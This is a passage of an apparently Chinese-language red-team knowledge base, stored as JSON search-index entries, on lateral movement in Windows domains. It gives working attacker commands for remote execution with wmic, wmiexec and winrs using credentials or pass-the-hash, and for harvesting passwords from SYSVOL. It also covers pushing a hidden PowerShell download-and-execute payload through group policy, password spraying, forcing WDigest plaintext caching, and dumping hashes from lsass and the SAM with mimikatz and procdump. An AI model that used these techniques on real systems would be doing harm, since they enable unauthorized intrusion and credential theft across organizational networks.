98\u5f00\u59cb\uff0cWindows\u64cd\u4f5c\u7cfb\u7edf\u90fd\u652f\u6301WMI\u3002WMI\u662f\u7531\u4e00\u7cfb\u5217\u5de5\u5177\u96c6\u7ec4\u6210\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7/node\u9009\u9879\u4f7f\u7528\u7aef\u53e3135\u4e0a\u7684\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(RPC)\u8fdb\u884c\u901a\u4fe1\u4ee5\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\uff0c\u5b83\u5141\u8bb8\u7cfb\u7edf\u7ba1\u7406\u5458\u8fdc\u7a0b\u6267\u884c\u81ea\u52a8\u5316\u7ba1\u7406\u4efb\u52a1\uff0c\u4f8b\u5982\u8fdc\u7a0b\u542f\u52a8\u670d\u52a1\u6216\u6267\u884c\u547d\u4ee4\u3002\u5e76\u4e14wimc\u6267\u884c\u547d\u4ee4\u65f6\u4e0d\u4f1a\u7559\u4e0b\u65e5\u5fd7\u4fe1\u606f\u3002 \u901a\u8fc7wmic\u5728\u8fdc\u7a0b\u4e3b\u673a\u4e0a\u5f00\u542f\u8fdb\u7a0b wmic /node:192.168.183.130 /user:administrator /password:Liu78963 process call create \"command\" wmiexec \u901a\u8fc7wmic\u521b\u5efa\u8fdc\u7a0b\u8fdb\u7a0b\u65f6\uff0c\u4e0d\u4f1a\u6709\u56de\u663e\uff0c\u9700\u8981\u901a\u8fc7ipc\\$\u94fe\u63a5type\uff0c\u91cd\u5b9a\u5411\u7b49\u624b\u6bb5\u624d\u80fd\u770b\u5230\u56de\u663e\u7ed3\u679c\uff0c\u5c31\u5f88\u4e0d\u65b9\u4fbf\uff0cwmicexec\u7684\u51fa\u73b0\u5c31\u5f88\u597d\u7684\u89e3\u51b3\u4e86\u8fd9\u4e00\u75db\u70b9\u3002\u5177\u4f53\u539f\u7406\u662f\u901a\u8fc7wmic\u5728135\u7aef\u53e3\u8fdb\u884c\u4ea4\u4e92\uff0c\u518d\u628a\u5185\u5bb9\u901a\u8fc7445\u7aef\u53e3\u4f20\u56de\u6765\u3002 wmiexec\u666e\u904d\u6765\u8bf4\u6709\u4e09\u79cd\u7248\u672c.py\uff0cexe\uff0c.vbs\u3002\u53ef\u4ee5\u8d70socks5\u534f\u8bae\u4ee3\u5165\u5185\u7f51\uff0c\u675c\u7edd\u4e86bypassav\u7684\u9ebb\u70e6\u3002 (exe\u7248\u672c\u7f51\u4e0a\u4f3c\u4e4e\u5f88\u4e0d\u597d\u627e) \u8fd9\u91cc\u7528python\u7248\u672c\uff0c\u4e0b\u8f7d\u94fe\u63a5 https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22\uff0c impacket\u6309\u7167\u7f51\u4e0a\u5b89\u88c5\u6765\u5f04\u5c31\u884c\u4e86 1.\u73af\u5883linux\uff0c\u6211\u4eec\u914d\u7f6e\u597dproxychanis\u4ee3\u5165\u5185\u7f51\uff08\u7565 2.proxychains wmiexec.py \u57df\u540d/\u7528\u6237\u540d:\u5bc6\u7801@ip \u83b7\u5f97shell 3.\u4e5f\u53ef\u4ee5\u8fdb\u884chash\u4f20\u9012 python wmiexec.py -hashes LM Hash:NT Hash \u57df\u540d/\u7528\u6237\u540d@\u76ee\u6807IP \u6548\u679c\u56fe winrm \u200b winRm\uff08\u5fae\u8f6f\u8fdc\u7a0b\u7ba1\u7406\uff09\u662fWS-Management\u534f\u8bae\u7684\u5b9e\u73b0\u7ec4\u4ef6\u3002WinRM\u662fwindows\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\u3002\u662f\u4e00\u9879\u5141\u8bb8\u7ba1\u7406\u5458\u5728\u7cfb\u7edf\u4e0a\u8fdc\u7a0b\u6267\u884c\u7ba1\u7406\u4efb\u52a1\u7684\u670d\u52a1\u3002\u901a\u4fe1\u901a\u8fc7HTTP\uff085985\uff09\u6216HTTPS SOAP\uff085986\uff09\u6267\u884c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u652f\u6301Kerberos\u548cNTLM\u8eab\u4efd\u9a8c\u8bc1\u4ee5\u53ca\u57fa\u672c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u4f60\u9700\u8981\u7ba1\u7406\u5458\u8eab\u4efd\u624d\u80fd\u4f7f\u7528\u5b83\u3002 \u200b \u9002\u7528\u7248\u672c:\u9002\u7528\u4e8e Win server 2008 / Win7 \u53ca\u4ee5\u540e\u7684\u7cfb\u7edf\uff0c\u4f46\u662f Win server 2008 / PC \u5168\u7248\u672c\u7cfb\u7edf\u9ed8\u8ba4\u5173\u95ed\u3002\u53ea\u6709\u5728Win server 2012 \u4e4b\u540e\u7684\u7248\u672c\u7684WinRM\u670d\u52a1\u624d\u9ed8\u8ba4\u542f\u52a8\u5e76\u76d1\u542c\u4e865985\u7aef\u53e3\uff0c\u5141\u8bb8\u8fdc\u7a0b\u4efb\u610f\u4e3b\u673a\u6765\u7ba1\u7406\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0bpowershell\u547d\u4ee4\u67e5\u770b\u673a\u5668\u4e0a\u7684winrm\u662f\u5426\u6b63\u5e38\u8fd0\u884c Get-WmiObject -Class win32_service | Where-Object {$_.name -like \"WinRM\"} \u82e5\u6ca1\u5f00\u542f\uff0c\u4f60\u53ef\u4ee5\u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0b\u6267\u884c\u4ee5\u4e0b\u6307\u4ee4\u5f00\u542f winrm quickconfig -q or Enable-PSRemoting -Force \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c winrs -r:192.168.86.114 -u:192.168.86.114\\administrator -p:123456!@#$% whoami \u5229\u7528\u7ec4\u7b56\u7565 \u8bfb\u53d6\u811a\u672c\u4e2d\u7684\u5bc6\u7801 \u5047\u8bbe\u57df\u7ba1\u60f3\u901a\u8fc7\u7ec4\u7b56\u7565\u6765\u4fee\u6539\u7528\u6237\u5bc6\u7801\uff0c\u5982\u679c\u4ed6\u4e0d\u4f7f\u7528GPP\uff0c\u90a3\u4e48\u4ed6\u53ea\u6709\u901a\u8fc7GPO\u914d\u5408\u811a\u672c\u4e0b\u53d1\u7684\u65b9\u5f0f\u6765\u4fee\u6539\u7528\u6237\u5bc6\u7801\u3002 \u8fd9\u79cd\u811a\u672c\u53ef\u80fd\u4f1a\u957f\u5f97\u50cf\u8fd9\u6837 strComputer = \".\" Set objUser = GetObject(\"WinNT://\" & strComputer & \"/Administrator, user\") objUser.SetPassword \"123QWEQWE!@#\" objUser.SetInfo \u4fdd\u5b58\u8fd9\u4e2a\u811a\u672c\u4e3a cpass.vbs ,\u8fd9\u4e2a\u811a\u672c\u7684\u4f5c\u7528\u5c31\u662f\u4fee\u6539\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u7684\u5bc6\u7801\u4e3a 123QWEQWE!@# \u7136\u540e\u901a\u8fc7GPO\u4e0b\u53d1\u6b64\u811a\u672c\uff0c\u8be5\u811a\u672c\u5c31\u4f1a\u88ab\u4fdd\u5b58\u4e8eSYSVOL\u6587\u4ef6\u5939\u4e2d\u3002 \u53c8\u56e0\u4e3a\u57df\u4e2d\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u8bfb\u53d6SYSVOL\u6587\u4ef6\u5939\u4e2d\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u6307\u4e0d\u5b9a\u5c31\u4f1a\u7ffb\u5230\u8fd9\u79cd\u66b4\u9732\u660e\u6587\u5bc6\u7801\u7684\u811a\u672c\u3002 for /r \\\\dc/sysvol %i in (*.vbs) do @echo %i for /r \\\\dc/sysvol %i in (*.bat) do @echo %i \u4f46\u662f\u6709\u4e9b\u65f6\u5019\u5bc6\u7801\u4f1a\u88ab\u52a0\u5bc6\uff0c\u53ef\u4ee5\u7528\u6b64\u5de5\u5177\u89e3\u51b3 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 \u4fee\u590d\uff1a\u6253\u4e86\u8865\u4e01KB2962486\u540e\uff0c\u65e0\u6cd5\u5728\u7ec4\u7b56\u7565\u4e2d\u8bbe\u7f6e\u7528\u6237\u540d\u5bc6\u7801\u3002 \u6279\u91cf\u5bc6\u7801 \u57df\u7ba1\u53ef\u80fd\u4f1a\u7528\u7ec4\u7b56\u7565\u6279\u91cf\u4fee\u6539\u57df\u4e2d\u7528\u6237\u5bc6\u7801\uff08\u7279\u522b\u662f\u672c\u5730\u7ba1\u7406\u5458\uff09\u3002\u6240\u4ee5\u62ff\u5230\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u540e\u4e0d\u59a8\u8bd5\u8bd5\u5bc6\u7801\u590d\u7528\uff0c\u6307\u4e0d\u5b9a\u5c31\u6709\u60ca\u559c \u7ec4\u7b56\u7565\u4e0b\u53d1\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8 \u6709\u65f6\u5019\u62ff\u4e0b\u57df\u7ba1\uff0c\u4f46\u662f\u76ee\u6807\u673a\u5668\u6709\u9632\u706b\u5899\u7b49\u539f\u56e0\u4e0d\u80fd\u76f4\u63a5smb\u6216\u8005wmi\u8bbf\u95ee\u3002\u6b64\u65f6\u53ef\u7528\u7ec4\u7b56\u7565\u4e0b\u53d1\u6728\u9a6c\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u3002 https://github.com/FSecureLABS/SharpGPOAbuse c#\u7a0b\u5e8f\uff0c\u5728cs\u4e0a\u53ef\u4ee5\u901a\u8fc7execute-assembly\u6765\u5185\u5b58\u6267\u884c\uff0c\u514d\u6740\u6027++\u3002 #\u52a0\u8f7dGroupPolicy\u6a21\u5757 \uff08win7\u6ca1\u6709\uff0cwin10\u6709\uff09 Import-Module GroupPolicy #\u521b\u5efa\u4e00\u4e2aGPO\u5e76\u5c06GPO\u94fe\u63a5\u5230\u57dftest.local\uff0c\u9700\u8981\u57df\u7ba1\u6743\u9650\u3002 new-gpo -name TestGPO | new-gplink -Target \"dc=test,dc=local\" #\u6dfb\u52a0\u5b9a\u65f6\u4efb\u52a1 --TargetDnsName\u6307\u5b9a\u8ba1\u7b97\u673a SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update2\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c calc.exe\" --GPOName \"TestGPO2\" --FilterEnabled --TargetDnsName PC-jack-0day.0day.org # cs\u7248\u672c execute-assembly F:\\\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update2\" --Author demo\\\\administrator --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.1/payload.ps1'))\\\"\" --GPOName \"TestGP02\" --FilterEnabled --TargetDnsName 192.168.40.148 #\u5f3a\u5236\u66f4\u65b0\u7ec4\u7b56\u7565\u4f7f\u7ec4\u7b56\u7565\u7acb\u5373\u751f\u6548\uff0c\u6216\u8005\u9ed8\u8ba4\u7b49\u5f8590\u5206\u949f\u7b49\u5f85\u7ec4\u7b56\u7565\u81ea\u5df1\u66f4\u65b0 gpupdate /force #\u5220\u9664GPO Remove-GPO -Name TestGPO2 \u5bc6\u7801\u55b7\u6d12 https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1 powershell -exec bypass Import-Module .\\Invoke-DomainPasswordSprayOutsideTheDomain.ps1 \u4f7f\u2f64\u5355\u4e2a\u5bc6\u7801 Invoke-DomainPasswordSprayOutsideTheDomain -UserList users.txt -Domain \"10.10.10.10/DC=redteam,DC=com\" -Password admin!@#45 \u4f7f\u7528\u5bc6\u7801\u6587\u4ef6 Invoke-DomainPasswordSprayOutsideTheDomain -UserList users.txt -Domain \"192.168.1.1/DC=test,DC=com\" -PasswordList passlist.txt -OutFile sprayed-creds.txt \u5982\u679c\u4e0d\u52a0userlist\u53c2\u6570\uff0c\u5c31\u4f1a\u600e\u4e48\u83b7\u53d6\u57df\u5185\u7528\u6237\u540d\u8fdb\u884c\u55b7\u6d12 https://github.com/dafthack/DomainPasswordSpray \u81ea\u52a8\u6536\u96c6\u57df\u5185\u7528\u6237\u7136\u540e\u55b7\u6d12 Invoke-DomainPasswordSpray -Password Spring2017 \u7528\u8d26\u6237\u540d\u6587\u4ef6\u548c\u5bc6\u7801\u6587\u4ef6 Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt","title":"\u6a2a\u5411\u79fb\u52a8\u65b9\u6cd5\u603b\u6c47"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_1","text":"","title":"\u6a2a\u5411\u79fb\u52a8\u65b9\u6cd5\u603b\u6c47"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_2","text":"PTH KB2871997 \u5173\u4e8eKB2871997\u7684\u4e00\u4e2a\u8bef\u89e3 HASH\u83b7\u53d6. hash \u4f20\u9012\u653b\u51fb PTH \uff08Pass the Hash) MS14-068 PAC MS14068 M14068\u5229\u7528 kerberoast How to get SPN How to get HASH How to export hash How to crack HASH How to use Kerberoast AS_REP Roast How to get HASH How to crack hash \u59d4\u6d3e\u653b\u51fb \u57df\u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e \u7ea6\u675f\u6027\u59d4\u6d3e \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e \u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb 1.\u8fdb\u884c\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u8d26\u6237\u626b\u63cf 2.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb 3.\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u914d\u5408 Spooler\u6253\u5370\u673a\u670d\u52a1 \u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e \u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a \u653b\u51fb\u6d41\u7a0b: \u5b9e\u64cd \u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7 credssp \u5bfc\u51fa\u7528\u6237\u660e\u6587\u5bc6\u7801 \u653b\u51fb\u539f\u7406 \u5b9e\u64cd tscon\u6a2a\u5411 \u5229\u7528COM/DCOM\u5bf9\u8c61 \u524d\u8a00 MMC20.APPLICATION.1 ipc ipc\u7b80\u4ecb \u5229\u7528ipc\u6a2a\u5411\u79fb\u52a8 at schtasks sc wmi wmiexec winrm \u5229\u7528\u7ec4\u7b56\u7565 \u8bfb\u53d6\u811a\u672c\u4e2d\u7684\u5bc6\u7801 \u6279\u91cf\u5bc6\u7801 \u7ec4\u7b56\u7565\u4e0b\u53d1\u8ba1\u5212\u4efb\u52a1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8 \u5bc6\u7801\u55b7\u6d12","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#pth","text":"\u5982\u679c\u627e\u5230\u4e86\u67d0\u4e2a\u7528\u6237\u7684ntlm hash\uff0c\u5c31\u53ef\u4ee5\u62ff\u8fd9\u4e2antlm hash\u5f53\u4f5c\u51ed\u8bc1\u8fdb\u884c\u8fdc\u7a0b\u767b\u9646\u4e86 \u5176\u4e2d\u82e5hash\u52a0\u5bc6\u65b9\u5f0f\u662f rc4 \uff0c\u90a3\u4e48\u5c31\u662fpass the hash \u82e5\u52a0\u5bc6\u65b9\u5f0f\u662faes key,\u90a3\u4e48\u5c31\u662fpass the key \u6ce8\u610fNTLM\u548ckerberos\u534f\u8bae\u5747\u5b58\u5728PTH: NTLM\u81ea\u7136\u4e0d\u7528\u591a\u8bf4 kerberos\u534f\u8bae\u4e5f\u662f\u57fa\u4e8e\u7528\u6237\u7684client hash\u5f00\u59cb\u4e00\u6b65\u6b65\u8ba4\u8bc1\u7684\uff0c\u81ea\u7136\u4e5f\u4f1a\u53d7PTH\u5f71\u54cd \u90a3\u524d\u63d0\u5c31\u662f\u8981\u83b7\u53d6hash\u503c\u4e86","title":"PTH"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#kb2871997","text":"\u5982\u679c\u7cfb\u7edf\u5b89\u88c5 KB2871997 \u8865\u4e01\u6216\u8005\u7cfb\u7edf\u7248\u672c\u5927\u4e8e\u7b49\u4e8ewindow server 2012\u65f6(\u670d\u52a1\u5668\u7248\u672c),\u5927\u4e8e\u7b49\u4e8ewin8.1(\u5bb6\u5ead\u7248\u672c)\u65f6\uff08\u81ea\u5e26\u8865\u4e01\uff09\uff0c\u9ed8\u8ba4\u5728lsass.exe\u8fd9\u4e2a\u8fdb\u7a0b\u4e2d\u4e0d\u4f1a\u518d\u5c06\u53ef\u9006\u7684\u5bc6\u6587\u7f13\u5b58\u5728\u81ea\u5df1\u7684\u8fdb\u7a0b\u5185\u5b58\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u9ed8\u8ba4\u662f\u6ca1\u529e\u6cd5\u901a\u8fc7\u8bfb\u53d6\u8fd9\u4e2a\u8fdb\u7a0b\u7136\u540e\u9006\u5411\u8be5\u5bc6\u6587\u6765\u83b7\u53d6\u660e\u6587\u5bc6\u7801 \u867d\u7136\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u6765\u4f7fLSASS\u5f3a\u5236\u5b58\u50a8\u660e\u6587\u5bc6\u7801 reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f \u4f46\u662f\u8fd9\u79cd\u65b9\u5f0f\u8981\u6c42\u7cfb\u7edf\u91cd\u542f\u6216\u8005\u7528\u6237\u91cd\u65b0\u767b\u5f55\uff0c\u5728\u5b9e\u6218\u4e2d\u64cd\u4f5c\u8d77\u6765\u6210\u529f\u7387\u8fd8\u662f\u6bd4\u8f83\u4f4e\u7684\u3002 \u540c\u65f6\u6bd4\u8f83\u91cd\u8981\u7684\u4e00\u70b9\u662f\u589e\u52a0\u4e86Protected Users\u7ec4\uff0c\u6240\u5c5e\u7528\u6237\u4f1a\u88ab\u5f3a\u5236\u8981\u6c42\u4f7f\u7528Kerberos\u8ba4\u8bc1\uff0c\u53ef\u4ee5\u907f\u514dPTH\u653b\u51fb\uff0c\u4ee5\u53ca\u7528\u6237\u6ce8\u9500\u540e\u5220\u9664\u51ed\u8bc1(\u660e\u6587\u5bc6\u7801\u3001LM/NTLM HASH\u3001Kerberos\u7684TGT\u7968\u636e\u7b49) \u4ee5\u53ca\uff1aRestricted Admin RDP\u6a21\u5f0f\u7684\u8fdc\u7a0b\u684c\u9762\u5ba2\u6237\u7aef\u652f\u6301","title":"KB2871997"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#kb2871997_1","text":"\u81eawindow vista\u4e4b\u540e\u6ca1\u529e\u6cd5\u4f7f\u7528RID\u975e500\u7684\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237\u6765\u8fdb\u884cPass The Hash, \u4f46\u662f\u5982\u679c\u662f\u57df\u7528\u6237\u4e14\u8be5\u57df\u7528\u6237\u5c5e\u4e8e\u672c\u5730Administrators\u7ec4\u7684\u6210\u5458\u4e5f\u53ef\u4ee5\u8fdb\u884cpass the hash\u3002 \u5f88\u591a\u4eba\u628a\u8fd9\u4e2a\u539f\u56e0\u5f52\u7ed3\u4e8eKB2871997\u8865\u4e01\uff0c\u5b9e\u9645\u4e0a\u4e0d\u7136\uff0c\u8fd9\u4e2a\u4e8b\u60c5\u7684\u6210\u56e0\u5b9e\u9645\u662fUAC\u5728\u6363\u4e71\u3002UAC\u662fwindow Vista\u7684\u65b0\u5b89\u5168\u7ec4\u4ef6\uff0c\u5177\u4f53\u662f\u4e2a\u5565\u8fd9\u91cc\u4e5f\u4e0d\u7ec6\u8bf4\u4e86\u3002 RID\u4e3a500\u7684\u8d26\u6237\u548c\u5c5e\u4e8e\u672c\u5730administrators\u7ec4\u7684\u57df\u7528\u6237\u5728\u901a\u8fc7\u7f51\u7edc\u8fdc\u7a0b\u94fe\u63a5\u65f6\uff0c\u9ed8\u8ba4\u5c31\u662f\u9ad8\u6743\u9650\u4ee4\u724c\u3002 \u800c\u975eRID500\u7684\u672c\u5730\u8d26\u6237\u5219\u4e3a\u4f4e\u6743\u9650\u4ee4\u724c\uff0c\u82e5\u60f3\u63d0\u5347\u6743\u9650\u5219\u9700\u901a\u8fc7\u4ea4\u4e92\u65b9\u5f0f\u767b\u5f55\u5230\u8981\u901a\u8fc7\u8fdc\u7a0b\u534f\u52a9\u6216\u8fdc\u7a0b\u684c\u9762\u7ba1\u7406\u7684\u8ba1\u7b97\u673a\u8d70UAC\u63d0\u6743\u3002 \u5173\u4e8e\u8fd9\u4e2a\u6210\u56e0\u7684\u4e00\u4e9b\u7cfb\u7edf\u914d\u7f6e\u9009\u9879\uff1a \u8fd9\u4e2a\u9879\u9ed8\u8ba4\u5141\u8bb8\u5185\u7f6e\u7ba1\u7406\u5458\u8d26\u6237\uff08RID500\u8d26\u6237\uff09\u5728\u6240\u6709\u5e94\u7528\u4e0b\u90fd\u4ee5\u9ad8\u6743\u9650\u4ee4\u724c\u8fd0\u884c\u3002\u8fd9\u4e5f\u662fRID500\u8d26\u6237\u80fdPTH\u7684\u539f\u56e0 \u540c\u65f6\u8fd8\u6709\u5982\u4e0b\u8fd9\u4e2a\u6ce8\u518c\u8868\u9879\uff0c\u53ef\u4ee5\u5173\u95edUAC\u7684\u8fdc\u7a0b\u9650\u5236\uff0c\u5373\u8fdc\u7a0b\u8fde\u63a5\u65f6UAC\u4f1a\u5931\u6548\uff0c\u8fd9\u6837\u7684\u8bdd\u53ea\u8981\u662fadministrators\u7ec4\u7684\u7528\u6237\u90fd\u80fdPTH\u8fa3\u3002 \u5176\u4e2d\u8be5\u503c\u4e3a0\u5219\u4ee3\u8868\u5f00\u542fUAC\u7684\u8fdc\u7a0b\u9650\u5236,\u8bbe\u7f6e\u8be5\u503c\u4e3a1\u65f6\u5173\u95ed\u8fdc\u7a0b\u9650\u5236. \u5728\u57df\u4e2d\uff0c\u53ea\u6709\u57df\u7ba1\u8d26\u6237\u548c\u57df\u7528\u6237\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u53ef\u4ee5\u6b63\u5e38PTH\u3002\u5728win10\u4e2d\u6d4b\u8bd5\uff0c\u4e0a\u9762\u63d0\u5230\u7684\u4e24\u4e2a\u53c2\u6570\u5747\u4e0d\u80fd\u5bf9\u57df\u7ba1\u3001\u57df\u7528\u6237\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u9020\u6210\u5f71\u54cd\u3002","title":"\u5173\u4e8eKB2871997\u7684\u4e00\u4e2a\u8bef\u89e3"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#hash","text":"1.\u4f7f\u7528meterpreter\u91cc\u7684mimikatz\u6a21\u5757 meterpreter>load mimikatz meterpreter>mimikatz_command -f mimikatz\u7684\u6307\u4ee4 privilege::debug \u63d0\u6743 samdump::hashes dump\u54c8\u5e0c \u6216\u8005 meterpreter>msv/kerberos/widgst 2.\u4f7f\u7528meterpreter\u81ea\u5e26\u7684hash\u83b7\u53d6\u6a21\u5757 meterpreter>hashdump meterpreter>run windows/gather/smart_hashdump (\u63a8\u8350\u4f7f\u7528\u8fd9\u4e2a) 3.\u5411\u76ee\u6807\u673a\u4e0a\u4f20mimikatz\u8fdc\u7a0b\u8c03\u7528mimikatz.exe dump\u51fahash\uff0cmimikatz\u9700\u8981\u514d\u6740\u5904\u7406 \u610f\u601d\u5c31\u662f\u65e2\u7136\u6211\u4eec\u83b7\u53d6\u5230\u4e86shell\uff0c\u6211\u4eec\u76f4\u63a5\u5411\u76ee\u6807\u673a\u4e0a\u4f20\u4e00\u4e2amimikatz\u7136\u540e\u5728shell\u91cc\u4f7f\u7528\u5b83\u5c31\u884c\u4e86. \u4f7f\u7528\u65b9\u6cd5\u4e3acmd\u7a97\u53e3\u6253\u5f00mimikatz.exe\uff0c\u8fdb\u5165mimikatz\u7ec8\u7aef\uff0c\u7136\u540e\u8f93\u5165mimikatz\u6307\u4ee4\u5373\u53ef 4.\u4e0a\u4f20procdump\u5230\u76ee\u6807\u673a\uff0c\u83b7\u53d6\u5230lsass.dmp\u6587\u4ef6\u540e\u5c06\u5176\u4f20\u56de\u672c\u5730\u53c8mimikatz\u6765dump\u54c8\u5e0c procdump.exe\u662f\u5fae\u8f6f\u81ea\u5e26\u7684\u7a0b\u5e8f\uff0c\u6240\u4ee5\u4e0d\u4f1a\u89e6\u53d1\u6740\u6bd2\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5b83\u4f20\u56delsass.dmp\u672c\u5730\u63d0\u53d6hash procdump64.exe -accepteula -ma lsass.exe lsass.dmp \u6267\u884c\u8be5\u6307\u4ee4\uff0c\u83b7\u53d6\u5230lsass.dmp \u7136\u540e\u5c06\u5176\u4f20\u56de\u672c\u5730 \u901a\u8fc7mimikatz.exe\u5206\u522b\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" Procdump \uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump mimikatz \uff1a https://github.com/gentilkiwi/mimikatz/releases 5.\u4f7f\u7528cobalt strike \u83b7\u53d6hash beacon>hashdump beacon>mimikatz mimikatz\u6307\u4ee4 6.\u5229\u7528sam\u8868 mimikatz\u5728\u7ebf\u8bfbsam\u8868\u4e2d\u7684hash privilege::debug token::elevate lsadump::sam \u5c06sam\u8868\u4e0b\u8f7d\u5230\u672c\u5730\u7531mimikatz\u5206\u6790 reg save HKLM\\SYSTEM SYSTEM reg save HKLM\\SAM SAM \u5728\u8fdc\u7aefshell\u4f7f\u7528\u4ee5\u4e0a\u547d\u4ee4\u5bfc\u51faSYSTEM \u548c SAM\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u5f85\u4f1a\u672c\u5730\uff0c\u7531mimikatz\u5206\u6790 mimikatz\u8fd0\u884c mimikatz # lsadump::sam /sam:SAM /system:SYSTEM Domain : STU1 SysKey : fd4639f4e27c79683ae9fee56b44393f Local SID : S-1-5-21-1982601180-2087634876-2293013296 SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17 RID : 000001f4 (500) User : Administrator Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0 RID : 000001f5 (501) User : Guest RID : 000003e8 (1000) User : liukaifeng01 Hash NTLM: 